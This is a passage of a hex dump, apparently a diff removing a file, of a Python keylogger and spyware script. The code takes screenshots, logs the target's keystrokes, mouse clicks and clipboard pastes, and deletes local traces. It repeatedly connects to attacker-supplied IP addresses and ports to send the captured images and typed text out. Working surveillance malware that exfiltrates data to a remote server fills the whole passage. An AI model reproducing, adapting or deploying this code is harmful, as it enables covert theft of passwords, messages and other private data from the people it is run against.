-00000e10: 636f 6e6e 6563 7473 2074 6f20 7468 6520  connects to the 
-00000e20: 7365 7276 6572 2079 6f75 2073 7065 6369  server you speci
-00000e30: 6669 6564 0d0a 2020 2020 2020 2020 696d  fied..        im
-00000e40: 6167 6520 3d20 7067 2e73 6372 6565 6e73  age = pg.screens
-00000e50: 686f 7428 290d 0a20 2020 2020 2020 2023  hot()..        #
-00000e60: 2022 696d 6167 6522 2073 6372 6565 6e73   "image" screens
-00000e70: 686f 7473 2074 6865 2063 7572 7265 6e74  hots the current
-00000e80: 2069 6d61 6765 2061 6674 6572 2061 2073   image after a s
-00000e90: 7065 6369 6669 6320 7469 6d65 0d0a 2020  pecific time..  
-00000ea0: 2020 2020 2020 666f 746f 6e61 6d65 203d        fotoname =
-00000eb0: 2066 2249 4d41 4745 2028 7b73 656c 662e   f"IMAGE ({self.
-00000ec0: 616d 6f75 6e74 7d29 2e70 6e67 220d 0a20  amount}).png".. 
-00000ed0: 2020 2020 2020 2023 204e 616d 6520 6f66         # Name of
-00000ee0: 2074 6865 2069 6d61 6765 0d0a 2020 2020   the image..    
-00000ef0: 2020 2020 696d 6167 652e 7361 7665 2866      image.save(f
-00000f00: 6f74 6f6e 616d 6529 0d0a 2020 2020 2020  otoname)..      
-00000f10: 2020 2320 5361 7665 7320 7468 6520 696d    # Saves the im
-00000f20: 6167 6520 696e 2074 6865 2063 7572 7265  age in the curre
-00000f30: 6e74 2064 6972 6563 746f 7279 0d0a 2020  nt directory..  
-00000f40: 2020 2020 2020 666f 7220 6576 6572 795f        for every_
-00000f50: 696d 6167 6520 696e 206f 732e 6c69 7374  image in os.list
-00000f60: 6469 7228 293a 0d0a 2020 2020 2020 2020  dir():..        
-00000f70: 2020 2020 6966 2022 494d 4147 4522 2069      if "IMAGE" i
-00000f80: 6e20 6576 6572 795f 696d 6167 653a 0d0a  n every_image:..
-00000f90: 2020 2020 2020 2020 2020 2020 2020 2020                  
-00000fa0: 7769 7468 206f 7065 6e28 6576 6572 795f  with open(every_
-00000fb0: 696d 6167 652c 2022 7262 2229 2061 7320  image, "rb") as 
-00000fc0: 6669 6c65 3a0d 0a20 2020 2020 2020 2020  file:..         
-00000fd0: 2020 2020 2020 2020 2020 2064 6174 6120             data 
-00000fe0: 3d20 6222 220d 0a20 2020 2020 2020 2020  = b""..         
-00000ff0: 2020 2020 2020 2020 2020 2066 6f72 206c             for l
-00001000: 696e 6520 696e 2066 696c 653a 0d0a 2020  ine in file:..  
-00001010: 2020 2020 2020 2020 2020 2020 2020 2020                  
-00001020: 2020 2020 2020 6461 7461 202b 3d20 6c69        data += li
-00001030: 6e65 0d0a 2020 2020 2020 2020 2020 2020  ne..            
-00001040: 2020 2020 2020 2020 2320 4765 7473 2061          # Gets a
-00001050: 6c6c 2074 6865 2064 6174 6120 616e 6420  ll the data and 
-00001060: 7374 6f72 6573 2069 7420 696e 2022 7365  stores it in "se
-00001070: 6c66 2e69 6d61 6765 735f 6461 7461 220d  lf.images_data".
-00001080: 0a20 2020 2020 2020 2020 2020 2020 2020  .               
-00001090: 2073 656c 662e 696d 6167 6573 5f64 6174   self.images_dat
-000010a0: 615b 6576 6572 795f 696d 6167 655d 203d  a[every_image] =
-000010b0: 2064 6174 610d 0a20 2020 2020 2020 2023   data..        #
-000010c0: 204e 6f20 6d61 7474 6572 2069 6620 7468   No matter if th
-000010d0: 6520 7461 7267 6574 7320 6465 6c65 7465  e targets delete
-000010e0: 7320 7468 6520 696d 6167 6520 6974 2077  s the image it w
-000010f0: 696c 6c20 6265 2073 746f 7265 6420 6c6f  ill be stored lo
-00001100: 6361 6c6c 790d 0a0d 0a20 2020 2020 2020  cally....       
-00001110: 206f 732e 7265 6d6f 7665 2866 6f74 6f6e   os.remove(foton
-00001120: 616d 6529 0d0a 2020 2020 2020 2020 2320  ame)..        # 
-00001130: 5468 6973 2064 656c 6574 6573 2074 6865  This deletes the
-00001140: 2070 686f 746f 0d0a 0d0a 2020 2020 6465   photo....    de
-00001150: 6620 7365 6e64 5f69 6d61 6765 2873 656c  f send_image(sel
-00001160: 662c 2069 705f 7068 6f74 6f73 2c20 706f  f, ip_photos, po
-00001170: 7274 5f70 686f 746f 7329 3a0d 0a20 2020  rt_photos):..   
-00001180: 2020 2020 2070 7269 6e74 2873 656c 662e       print(self.
-00001190: 696d 6167 6573 5f64 6174 6129 0d0a 2020  images_data)..  
-000011a0: 2020 2020 2020 2320 4966 2074 6865 2073        # If the s
-000011b0: 6572 7665 7220 6973 2074 6865 2064 6f77  erver is the dow
-000011c0: 6e20 6974 2077 696c 6c20 7374 6f72 6520  n it will store 
-000011d0: 7468 6520 6461 7461 206c 6f63 616c 6c79  the data locally
-000011e0: 2061 6e64 2077 6169 7420 756e 7469 6c20   and wait until 
-000011f0: 7468 6520 7365 7276 6572 2069 7320 6176  the server is av
-00001200: 6169 6c61 626c 6520 6167 6169 6e2e 0d0a  ailable again...
-00001210: 2020 2020 2020 2020 7768 696c 6520 5472          while Tr
-00001220: 7565 3a0d 0a20 2020 2020 2020 2020 2020  ue:..           
-00001230: 2074 7279 3a0d 0a20 2020 2020 2020 2020   try:..         
-00001240: 2020 2020 2020 2073 656e 645f 696d 6167         send_imag
-00001250: 6573 203d 2073 6f63 6b65 742e 736f 636b  es = socket.sock
-00001260: 6574 2873 6f63 6b65 742e 4146 5f49 4e45  et(socket.AF_INE
-00001270: 542c 2073 6f63 6b65 742e 534f 434b 5f53  T, socket.SOCK_S
-00001280: 5452 4541 4d29 0d0a 2020 2020 2020 2020  TREAM)..        
-00001290: 2020 2020 2020 2020 7365 6e64 5f69 6d61          send_ima
-000012a0: 6765 732e 636f 6e6e 6563 7428 2869 705f  ges.connect((ip_
-000012b0: 7068 6f74 6f73 2c20 706f 7274 5f70 686f  photos, port_pho
-000012c0: 746f 7329 290d 0a0d 0a20 2020 2020 2020  tos))....       
-000012d0: 2020 2020 2020 2020 2073 656e 645f 696d           send_im
-000012e0: 6167 6573 2e73 656e 6428 7374 7228 7365  ages.send(str(se
-000012f0: 6c66 2e69 6d61 6765 735f 6461 7461 292e  lf.images_data).
-00001300: 656e 636f 6465 2829 290d 0a20 2020 2020  encode())..     
-00001310: 2020 2020 2020 2020 2020 2062 7265 616b             break
-00001320: 0d0a 2020 2020 2020 2020 2020 2020 6578  ..            ex
-00001330: 6365 7074 3a0d 0a20 2020 2020 2020 2020  cept:..         
-00001340: 2020 2020 2020 2063 6f6e 7469 6e75 650d         continue.
-00001350: 0a0d 0a20 2020 2064 6566 2063 6f75 6e74  ...    def count
-00001360: 646f 776e 5f73 656e 6428 7365 6c66 2c20  down_send(self, 
-00001370: 7a65 6974 2c20 6970 5f70 686f 746f 732c  zeit, ip_photos,
-00001380: 2070 6f72 745f 7068 6f74 6f73 2c20 6970   port_photos, ip
-00001390: 5f6b 6579 6c6f 6767 6572 2c20 706f 7274  _keylogger, port
-000013a0: 5f6b 6579 6c6f 6767 6572 293a 0d0a 2020  _keylogger):..  
-000013b0: 2020 2020 2020 7365 636f 6e64 735f 6c69        seconds_li
-000013c0: 7374 203d 205b 7a61 686c 2066 6f72 207a  st = [zahl for z
-000013d0: 6168 6c20 696e 2072 616e 6765 2830 2c20  ahl in range(0, 
-000013e0: 7a65 6974 202b 2031 2c20 3230 2920 6966  zeit + 1, 20) if
-000013f0: 207a 6168 6c20 213d 2030 5d0d 0a20 2020   zahl != 0]..   
-00001400: 2020 2020 2023 2054 6865 2073 6563 6f6e       # The secon
-00001410: 6473 2074 6865 2069 6d61 6765 2077 696c  ds the image wil
-00001420: 6c20 6265 2073 656e 7420 696e 2032 3020  l be sent in 20 
-00001430: 7374 6570 7320 746f 2074 6865 2073 6572  steps to the ser
-00001440: 7665 7220 7769 6c6c 2062 6520 7361 7665  ver will be save
-00001450: 6420 696e 2022 7365 636f 6e64 735f 6c69  d in "seconds_li
-00001460: 7374 220d 0a20 2020 2020 2020 2070 7269  st"..        pri
-00001470: 6e74 2873 6563 6f6e 6473 5f6c 6973 7429  nt(seconds_list)
-00001480: 0d0a 2020 2020 2020 2020 6b65 795f 6461  ..        key_da
-00001490: 7461 203d 2073 6f63 6b65 742e 736f 636b  ta = socket.sock
-000014a0: 6574 2873 6f63 6b65 742e 4146 5f49 4e45  et(socket.AF_INE
-000014b0: 542c 2073 6f63 6b65 742e 534f 434b 5f53  T, socket.SOCK_S
-000014c0: 5452 4541 4d29 0d0a 0d0a 2020 2020 2020  TREAM)....      
-000014d0: 2020 7472 793a 0d0a 2020 2020 2020 2020    try:..        
-000014e0: 2020 2020 666f 7220 7820 696e 2072 616e      for x in ran
-000014f0: 6765 287a 6569 7420 2b20 3129 3a0d 0a20  ge(zeit + 1):.. 
-00001500: 2020 2020 2020 2020 2020 2020 2020 2070                 p
-00001510: 7269 6e74 2878 290d 0a20 2020 2020 2020  rint(x)..       
-00001520: 2020 2020 2020 2020 207a 6569 7420 2d3d           zeit -=
-00001530: 2031 0d0a 2020 2020 2020 2020 2020 2020   1..            
-00001540: 2020 2020 7469 6d65 2e73 6c65 6570 2831      time.sleep(1
-00001550: 290d 0a20 2020 2020 2020 2020 2020 2020  )..             
-00001560: 2020 2069 6620 7820 696e 2073 6563 6f6e     if x in secon
-00001570: 6473 5f6c 6973 743a 0d0a 2020 2020 2020  ds_list:..      
-00001580: 2020 2020 2020 2020 2020 2020 2020 7365                se
-00001590: 6c66 2e63 6c69 656e 7428 290d 0a20 2020  lf.client()..   
-000015a0: 2020 2020 2020 2020 2020 2020 2020 2020                  
-000015b0: 2023 2054 6865 2069 6d61 6765 7320 7769   # The images wi
-000015c0: 6c6c 2062 6520 7365 6e74 0d0a 2020 2020  ll be sent..    
-000015d0: 2020 2020 2020 2020 7768 696c 6520 5472          while Tr
-000015e0: 7565 3a0d 0a20 2020 2020 2020 2020 2020  ue:..           
-000015f0: 2020 2020 2074 7279 3a0d 0a20 2020 2020       try:..     
-00001600: 2020 2020 2020 2020 2020 2020 2020 206b                 k
-00001610: 6579 5f64 6174 612e 636f 6e6e 6563 7428  ey_data.connect(
-00001620: 2869 705f 6b65 796c 6f67 6765 722c 2070  (ip_keylogger, p
-00001630: 6f72 745f 6b65 796c 6f67 6765 7229 290d  ort_keylogger)).
-00001640: 0a20 2020 2020 2020 2020 2020 2020 2020  .               
-00001650: 2020 2020 2062 7265 616b 0d0a 2020 2020       break..    
-00001660: 2020 2020 2020 2020 2020 2020 6578 6365              exce
-00001670: 7074 3a0d 0a20 2020 2020 2020 2020 2020  pt:..           
-00001680: 2020 2020 2020 2020 2063 6f6e 7469 6e75           continu
-00001690: 650d 0a0d 0a20 2020 2020 2020 2020 2020  e....           
-000016a0: 2023 2054 6869 7320 6973 2074 6865 2069   # This is the i
-000016b0: 7020 616e 6420 7468 6520 706f 7274 206f  p and the port o
-000016c0: 6620 7468 6520 7365 7276 6572 2074 6865  f the server the
-000016d0: 2070 6f72 7420 7368 6f75 6c64 6e27 7420   port shouldn't 
-000016e0: 6265 2074 6865 2073 616d 6520 7468 6520  be the same the 
-000016f0: 7365 7276 6572 5f70 686f 746f 7320 616e  server_photos an
-00001700: 6420 7468 6520 7365 7276 6572 5f6b 6579  d the server_key
-00001710: 6c6f 6767 6572 2073 686f 756c 646e 2774  logger shouldn't
-00001720: 2062 650d 0a20 2020 2020 2020 2020 2020   be..           
-00001730: 2023 2069 6e20 7468 6520 7361 6d65 2066   # in the same f
-00001740: 6f6c 6465 720d 0a20 2020 2020 2020 2020  older..         
-00001750: 2020 2070 7269 6e74 2873 656c 662e 636f     print(self.co
-00001760: 6f72 6469 6e61 7465 7329 0d0a 2020 2020  ordinates)..    
-00001770: 2020 2020 2020 2020 776f 7274 203d 2022          wort = "
-00001780: 220d 0a20 2020 2020 2020 2020 2020 2066  "..            f
-00001790: 6f72 207a 6569 6368 656e 2069 6e20 7365  or zeichen in se
-000017a0: 6c66 2e72 6963 6874 6967 655f 6c69 7374  lf.richtige_list
-000017b0: 653a 0d0a 2020 2020 2020 2020 2020 2020  e:..            
-000017c0: 2020 2020 776f 7274 202b 3d20 7a65 6963      wort += zeic
-000017d0: 6865 6e0d 0a0d 0a20 2020 2020 2020 2020  hen....         
-000017e0: 2020 2023 2047 6574 7320 7468 6520 636f     # Gets the co
-000017f0: 6f72 6469 6e61 7465 7320 7768 6572 6520  ordinates where 
-00001800: 7468 6520 7461 7267 6574 2077 6173 2077  the target was w
-00001810: 7269 7469 6e67 2073 6f6d 6574 6869 6e67  riting something
-00001820: 2066 726f 6d20 7468 6520 6265 6769 6e6e   from the beginn
-00001830: 696e 670d 0a20 2020 2020 2020 2020 2020  ing..           
-00001840: 2023 2053 656e 6473 2074 6865 2064 6174   # Sends the dat
-00001850: 6120 746f 2073 6572 7665 725f 6b65 796c  a to server_keyl
-00001860: 6f67 6765 720d 0a20 2020 2020 2020 2020  ogger..         
-00001870: 2020 2061 6c6c 5f64 6174 6120 3d20 7374     all_data = st
-00001880: 7228 7365 6c66 2e63 6f6f 7264 696e 6174  r(self.coordinat
-00001890: 6573 2920 2b20 776f 7274 0d0a 2020 2020  es) + wort..    
-000018a0: 2020 2020 2020 2020 2320 436f 6f72 6469          # Coordi
-000018b0: 6e61 7465 7320 616e 6420 6b65 7964 6174  nates and keydat
-000018c0: 6120 6172 6520 6265 696e 6720 636f 6e63  a are being conc
-000018d0: 6174 656e 6174 6564 0d0a 2020 2020 2020  atenated..      
-000018e0: 2020 2020 2020 6b65 795f 6461 7461 2e73        key_data.s
-000018f0: 656e 6428 616c 6c5f 6461 7461 2e65 6e63  end(all_data.enc
-00001900: 6f64 6528 2929 0d0a 2020 2020 2020 2020  ode())..        
-00001910: 2020 2020 7072 696e 7428 776f 7274 290d      print(wort).
-00001920: 0a20 2020 2020 2020 2020 2020 2070 7269  .            pri
-00001930: 6e74 2873 656c 662e 7269 6368 7469 6765  nt(self.richtige
-00001940: 5f6c 6973 7465 290d 0a20 2020 2020 2020  _liste)..       
-00001950: 2020 2020 2023 2043 6c6f 7365 7320 7468       # Closes th
-00001960: 6520 696d 6167 650d 0a0d 0a20 2020 2020  e image....     
-00001970: 2020 2020 2020 2073 656c 662e 7365 6e64         self.send
-00001980: 5f69 6d61 6765 2869 705f 7068 6f74 6f73  _image(ip_photos
-00001990: 2c20 706f 7274 5f70 686f 746f 7329 0d0a  , port_photos)..
-000019a0: 0d0a 2020 2020 2020 2020 2020 2020 2320  ..            # 
-000019b0: 5765 2068 6176 6520 746f 2067 6f20 6261  We have to go ba
-000019c0: 636b 2073 6f20 7468 6174 2077 6520 6361  ck so that we ca
-000019d0: 6e20 6465 6c65 7465 2074 6865 206f 7468  n delete the oth
-000019e0: 6572 2064 6972 6563 746f 7269 6573 0d0a  er directories..
-000019f0: 2020 2020 2020 2020 2020 2020 7379 732e              sys.
-00001a00: 6578 6974 2829 0d0a 2020 2020 2020 2020  exit()..        
-00001a10: 2020 2020 2320 5374 6f70 7320 7468 6520      # Stops the 
-00001a20: 6b65 796c 6f67 6765 720d 0a20 2020 2020  keylogger..     
-00001a30: 2020 2065 7863 6570 7420 4b65 7962 6f61     except Keyboa
-00001a40: 7264 496e 7465 7272 7570 743a 0d0a 2020  rdInterrupt:..  
-00001a50: 2020 2020 2020 2020 2020 7365 6c66 2e73            self.s
-00001a60: 656e 645f 696d 6167 6528 6970 5f70 686f  end_image(ip_pho
-00001a70: 746f 732c 2070 6f72 745f 7068 6f74 6f73  tos, port_photos
-00001a80: 290d 0a0d 0a20 2020 2020 2020 2020 2020  )....           
-00001a90: 2023 2049 6620 7468 6520 7461 7267 6574   # If the target
-00001aa0: 2068 6173 2064 6573 7472 6f79 6564 2074   has destroyed t
-00001ab0: 6865 2063 6f6e 6e65 6374 696f 6e0d 0a20  he connection.. 
-00001ac0: 2020 2020 2020 2020 2020 2077 6f72 7420             wort 
-00001ad0: 3d20 222a 2a2a 25c2 a7c2 a729 c2a7 c2a7  = "***%....)....
-00001ae0: 2522 0d0a 2020 2020 2020 2020 2020 2020  %"..            
-00001af0: 2320 5468 6973 2069 7320 6c69 6b65 2061  # This is like a
-00001b00: 2073 7065 6369 616c 2063 6f64 652e 2054   special code. T
-00001b10: 6f20 7370 6c69 7420 6974 2061 7420 7468  o split it at th
-00001b20: 6520 656e 640d 0a20 2020 2020 2020 2020  e end..         
-00001b30: 2020 2066 6f72 207a 6569 6368 656e 2069     for zeichen i
-00001b40: 6e20 7365 6c66 2e72 6963 6874 6967 655f  n self.richtige_
-00001b50: 6c69 7374 653a 0d0a 2020 2020 2020 2020  liste:..        
-00001b60: 2020 2020 2020 2020 776f 7274 202b 3d20          wort += 
-00001b70: 7a65 6963 6865 6e0d 0a20 2020 2020 2020  zeichen..       
-00001b80: 2020 2020 2069 6620 7365 6c66 2e63 6f6f       if self.coo
-00001b90: 7264 696e 6174 6573 3a0d 0a20 2020 2020  rdinates:..     
-00001ba0: 2020 2020 2020 2020 2020 2077 6f72 7420             wort 
-00001bb0: 2b3d 2073 7472 2873 656c 662e 636f 6f72  += str(self.coor
-00001bc0: 6469 6e61 7465 7329 0d0a 2020 2020 2020  dinates)..      
-00001bd0: 2020 2020 2020 6461 7461 203d 2066 2254        data = f"T
-00001be0: 4845 2043 4f4e 4e45 4354 494f 4e20 4841  HE CONNECTION HA
-00001bf0: 5320 4245 454e 2049 4e54 4552 5255 5054  S BEEN INTERRUPT
-00001c00: 4544 7b77 6f72 747d 220d 0a20 2020 2020  ED{wort}"..     
-00001c10: 2020 2020 2020 2023 2054 6869 7320 6c65         # This le
-00001c20: 7427 7320 7468 6520 7365 7276 6572 206b  t's the server k
-00001c30: 6e6f 7720 7468 6174 2074 6865 2073 6572  now that the ser
-00001c40: 7665 7220 7368 6f75 6c64 2073 6875 7420  ver should shut 
-00001c50: 646f 776e 0d0a 2020 2020 2020 2020 2020  down..          
-00001c60: 2020 7768 696c 6520 5472 7565 3a0d 0a20    while True:.. 
-00001c70: 2020 2020 2020 2020 2020 2020 2020 2074                 t
-00001c80: 7279 3a0d 0a20 2020 2020 2020 2020 2020  ry:..           
-00001c90: 2020 2020 2020 2020 206b 6579 5f64 6174           key_dat
-00001ca0: 612e 636f 6e6e 6563 7428 2869 705f 6b65  a.connect((ip_ke
-00001cb0: 796c 6f67 6765 722c 2070 6f72 745f 6b65  ylogger, port_ke
-00001cc0: 796c 6f67 6765 7229 290d 0a20 2020 2020  ylogger))..     
-00001cd0: 2020 2020 2020 2020 2020 2020 2020 206b                 k
-00001ce0: 6579 5f64 6174 612e 7365 6e64 2864 6174  ey_data.send(dat
-00001cf0: 612e 656e 636f 6465 2829 290d 0a20 2020  a.encode())..   
-00001d00: 2020 2020 2020 2020 2020 2020 2020 2020                  
-00001d10: 206b 6579 5f64 6174 612e 636c 6f73 6528   key_data.close(
-00001d20: 290d 0a20 2020 2020 2020 2020 2020 2020  )..             
-00001d30: 2020 2020 2020 2062 7265 616b 0d0a 2020         break..  
-00001d40: 2020 2020 2020 2020 2020 2020 2020 6578                ex
-00001d50: 6365 7074 3a0d 0a20 2020 2020 2020 2020  cept:..         
-00001d60: 2020 2020 2020 2020 2020 2063 6f6e 7469             conti
-00001d70: 6e75 650d 0a0d 0a20 2020 2020 2020 2020  nue....         
-00001d80: 2020 2069 6620 6e6f 7420 6f73 2e6c 6973     if not os.lis
-00001d90: 7464 6972 2829 3a0d 0a20 2020 2020 2020  tdir():..       
-00001da0: 2020 2020 2020 2020 2064 6174 6120 3d20           data = 
-00001db0: 5b69 6d61 6765 2066 6f72 2069 6d61 6765  [image for image
-00001dc0: 2069 6e20 6f73 2e6c 6973 7464 6972 2829   in os.listdir()
-00001dd0: 2069 6620 2249 4d41 4745 2220 696e 2069   if "IMAGE" in i
-00001de0: 6d61 6765 5d0d 0a20 2020 2020 2020 2020  mage]..         
-00001df0: 2020 2020 2020 2066 6f72 2065 6163 6820         for each 
-00001e00: 696e 2064 6174 613a 0d0a 2020 2020 2020  in data:..      
-00001e10: 2020 2020 2020 2020 2020 2020 2020 6f73                os
-00001e20: 2e72 656d 6f76 6528 6561 6368 290d 0a0d  .remove(each)...
-00001e30: 0a20 2020 2064 6566 206b 696c 6c5f 7377  .    def kill_sw
-00001e40: 6974 6368 2873 656c 6629 3a0d 0a20 2020  itch(self):..   
-00001e50: 2020 2020 2023 2054 6869 7320 6675 6e63       # This func
-00001e60: 7469 6f6e 2064 6573 7472 6f79 7320 7468  tion destroys th
-00001e70: 6520 6d6f 7573 6520 696e 666f 0d0a 2020  e mouse info..  
-00001e80: 2020 2020 2020 6e65 775f 7365 636f 6e64        new_second
-00001e90: 7320 3d20 7365 6c66 2e64 7572 6174 696f  s = self.duratio
-00001ea0: 6e20 2b20 350d 0a20 2020 2020 2020 2023  n + 5..        #
-00001eb0: 2032 3020 7365 636f 6e64 7320 6172 6520   20 seconds are 
-00001ec0: 6265 696e 6720 6164 6465 6420 6265 6361  being added beca
-00001ed0: 7573 6520 7468 6572 6520 6d69 6768 7420  use there might 
-00001ee0: 6265 2061 2070 726f 626c 656d 0d0a 2020  be a problem..  
-00001ef0: 2020 2020 2020 666f 7220 7820 696e 2072        for x in r
-00001f00: 616e 6765 286e 6577 5f73 6563 6f6e 6473  ange(new_seconds
-00001f10: 293a 0d0a 2020 2020 2020 2020 2020 2020  ):..            
-00001f20: 7469 6d65 2e73 6c65 6570 2831 290d 0a20  time.sleep(1).. 
-00001f30: 2020 2020 2020 2023 2054 6869 7320 7374         # This st
-00001f40: 6f70 6573 2074 6865 0d0a 2020 2020 2020  opes the..      
-00001f50: 2020 7379 732e 6578 6974 2829 0d0a 0d0a    sys.exit()....
-00001f60: 2020 2020 6465 6620 6f6e 5f63 6c69 636b      def on_click
-00001f70: 2873 656c 662c 2078 2c20 792c 2062 7574  (self, x, y, but
-00001f80: 746f 6e2c 2070 7265 7373 6564 293a 0d0a  ton, pressed):..
-00001f90: 2020 2020 2020 2020 2320 5468 6973 2069          # This i
-00001fa0: 7320 7468 6520 636c 6963 6b20 6675 6e63  s the click func
-00001fb0: 7469 6f6e 0d0a 2020 2020 2020 2020 7072  tion..        pr
-00001fc0: 696e 7428 6622 5461 7267 6574 2068 6173  int(f"Target has
-00001fd0: 2070 7265 7373 6564 207b 787d 2061 6e64   pressed {x} and
-00001fe0: 207b 797d 2229 0d0a 2020 2020 2020 2020   {y}")..        
-00001ff0: 2320 416c 6c20 7468 6520 636f 6f72 6469  # All the coordi
-00002000: 6e61 7465 7320 7769 6c6c 2062 6520 7374  nates will be st
-00002010: 6f72 6564 2069 6e20 2273 656c 662e 636f  ored in "self.co
-00002020: 6f72 6469 6e61 7465 7322 0d0a 2020 2020  ordinates"..    
-00002030: 2020 2020 6966 2028 782c 7929 206e 6f74      if (x,y) not
-00002040: 2069 6e20 7365 6c66 2e63 6f6f 7264 696e   in self.coordin
-00002050: 6174 6573 3a0d 0a20 2020 2020 2020 2020  ates:..         
-00002060: 2020 2073 656c 662e 636f 6f72 6469 6e61     self.coordina
-00002070: 7465 732e 6170 7065 6e64 2828 782c 2079  tes.append((x, y
-00002080: 2929 0d0a 0d0a 2020 2020 6465 6620 616c  ))....    def al
-00002090: 6c5f 636c 6963 6b73 2873 656c 6629 3a0d  l_clicks(self):.
-000020a0: 0a20 2020 2020 2020 2023 2054 6869 7320  .        # This 
-000020b0: 6973 206a 7573 7420 6120 6675 6e63 7469  is just a functi
-000020c0: 6f6e 2073 6f20 6974 2063 616e 2062 6520  on so it can be 
-000020d0: 7261 6e20 7769 7468 2074 6872 6561 6469  ran with threadi
-000020e0: 6e67 0d0a 2020 2020 2020 2020 7769 7468  ng..        with
-000020f0: 204c 6973 7465 6e65 7228 6f6e 5f63 6c69   Listener(on_cli
-00002100: 636b 3d73 656c 662e 6f6e 5f63 6c69 636b  ck=self.on_click
-00002110: 2920 6173 206c 6973 7465 6e69 6e67 3a0d  ) as listening:.
-00002120: 0a20 2020 2020 2020 2020 2020 2073 656c  .            sel
-00002130: 662e 6b69 6c6c 5f73 7769 7463 6828 290d  f.kill_switch().
-00002140: 0a20 2020 2020 2020 2020 2020 206c 6973  .            lis
-00002150: 7465 6e69 6e67 2e6a 6f69 6e28 290d 0a0d  tening.join()...
-00002160: 0a20 2020 2064 6566 2063 6f70 795f 6461  .    def copy_da
-00002170: 7461 2873 656c 6629 3a0d 0a20 2020 2020  ta(self):..     
-00002180: 2020 2073 656c 662e 7269 6368 7469 6765     self.richtige
-00002190: 5f6c 6973 7465 2e61 7070 656e 6428 2220  _liste.append(" 
-000021a0: 2843 4f50 5920 2853 7472 672b 6329 2920  (COPY (Strg+c)) 
-000021b0: 2229 0d0a 0d0a 2020 2020 6465 6620 6170  ")....    def ap
-000021c0: 7065 6e64 5f70 6173 7465 2873 656c 6629  pend_paste(self)
-000021d0: 3a0d 0a20 2020 2020 2020 2064 6174 6120  :..        data 
-000021e0: 3d20 6622 2028 7b70 7970 6572 636c 6970  = f" ({pyperclip
-000021f0: 2e70 6173 7465 2829 7d20 7c20 5041 5354  .paste()} | PAST
-00002200: 4520 2853 7472 672b 7629 2920 7c20 220d  E (Strg+v)) | ".
-00002210: 0a20 2020 2020 2020 2073 656c 662e 7269  .        self.ri
-00002220: 6368 7469 6765 5f6c 6973 7465 2e61 7070  chtige_liste.app
-00002230: 656e 6428 6461 7461 290d 0a0d 0a20 2020  end(data)....   
-00002240: 2064 6566 2070 7269 6e74 5f77 6f72 6b28   def print_work(
-00002250: 7365 6c66 2c20 776f 7264 293a 0d0a 2020  self, word):..  
-00002260: 2020 2020 2020 7072 696e 7428 6627 416c        print(f'Al
-00002270: 7068 6162 6574 6963 206b 6579 2077 6173  phabetic key was
-00002280: 2070 7265 7373 6564 3a20 7b77 6f72 647d   pressed: {word}
-00002290: 2027 290d 0a20 2020 2020 2020 2073 656c   ')..        sel
-000022a0: 662e 7269 6368 7469 6765 5f6c 6973 7465  f.richtige_liste
-000022b0: 202b 3d20 776f 7264 0d0a 2020 2020 2020   += word..      
-000022c0: 2020 2320 4576 6572 7920 7072 6573 7365    # Every presse
-000022d0: 6420 6b65 7920 7769 6c6c 2062 6520 7361  d key will be sa
-000022e0: 7665 6420 696e 2022 7269 6368 7469 6765  ved in "richtige
-000022f0: 5f6c 6973 7465 2220 7468 6973 2069 7320  _liste" this is 
-00002300: 6120 6765 726d 616e 2073 656c 662e 776f  a german self.wo
-00002310: 7264 2061 6e64 206d 6561 6e73 2022 7269  rd and means "ri
-00002320: 6768 745f 6c69 7374 220d 0a0d 0a20 2020  ght_list"....   
-00002330: 2064 6566 206f 6e5f 7072 6573 7328 7365   def on_press(se
-00002340: 6c66 2c20 6b65 7929 3a0d 0a20 2020 2020  lf, key):..     
-00002350: 2020 2074 7279 3a0d 0a20 2020 2020 2020     try:..       
-00002360: 2020 2020 2074 7279 3a0d 0a20 2020 2020       try:..     
-00002370: 2020 2020 2020 2020 2020 206f 7468 6572             other
-00002380: 5f63 6861 7265 6374 6572 7320 3d20 7b22  _charecters = {"
-00002390: 3122 3a20 2221 222c 2022 3222 3a20 2722  1": "!", "2": '"
-000023a0: 272c 2022 3322 3a20 22c2 a722 2c20 2234  ', "3": "..", "4
-000023b0: 223a 2022 2422 2c20 2235 223a 2022 2522  ": "$", "5": "%"
-000023c0: 2c20 2236 223a 2022 2622 2c20 2237 223a  , "6": "&", "7":
-000023d0: 2022 2f22 2c20 2238 223a 2022 2822 2c0d   "/", "8": "(",.
-000023e0: 0a20 2020 2020 2020 2020 2020 2020 2020  .               
-000023f0: 2020 2020 2020 2020 2020 2020 2020 2020                  
-00002400: 2020 2020 2022 3922 3a20 2229 222c 2022       "9": ")", "
-00002410: 3022 3a20 223d 222c 2022 c39f 223a 2022  0": "=", "..": "
-00002420: 3f22 7d0d 0a20 2020 2020 2020 2020 2020  ?"}..           
-00002430: 2020 2020 2069 6620 7365 6c66 2e63 6170       if self.cap
-00002440: 7320 6973 2054 7275 653a 0d0a 2020 2020  s is True:..    
-00002450: 2020 2020 2020 2020 2020 2020 2020 2020                  
-00002460: 6966 206b 6579 2e63 6861 7220 696e 206f  if key.char in o
-00002470: 7468 6572 5f63 6861 7265 6374 6572 733a  ther_charecters:
-00002480: 0d0a 2020 2020 2020 2020 2020 2020 2020  ..              
-00002490: 2020 2020 2020 2020 2020 7365 6c66 2e77            self.w
-000024a0: 6f72 6420 3d20 6f74 6865 725f 6368 6172  ord = other_char
-000024b0: 6563 7465 7273 5b6b 6579 2e63 6861 725d  ecters[key.char]
-000024c0: 0d0a 2020 2020 2020 2020 2020 2020 2020  ..              
-000024d0: 2020 2020 2020 2020 2020 2320 5570 7065            # Uppe
-000024e0: 7220 4368 6172 6163 7465 7273 2066 726f  r Characters fro
-000024f0: 6d20 2231 2220 746f 2022 3022 2062 6563  m "1" to "0" bec
-00002500: 6175 7365 2061 6c6c 2074 6869 7320 6e75  ause all this nu
-00002510: 6d62 6572 7320 6172 6520 6e6f 7420 6368  mbers are not ch
-00002520: 6172 6563 7465 7273 2061 7265 206e 6f74  arecters are not
-00002530: 2069 6e20 7079 6e70 7574 0d0a 2020 2020   in pynput..    
-00002540: 2020 2020 2020 2020 2020 2020 2020 2020                  
-00002550: 656c 7365 3a0d 0a20 2020 2020 2020 2020  else:..         
-00002560: 2020 2020 2020 2020 2020 2020 2020 2073                 s
-00002570: 656c 662e 776f 7264 203d 206b 6579 2e63  elf.word = key.c
-00002580: 6861 722e 7570 7065 7228 290d 0a20 2020  har.upper()..   
-00002590: 2020 2020 2020 2020 2020 2020 2065 6c73               els
-000025a0: 653a 0d0a 2020 2020 2020 2020 2020 2020  e:..            
-000025b0: 2020 2020 2020 2020 7365 6c66 2e77 6f72          self.wor
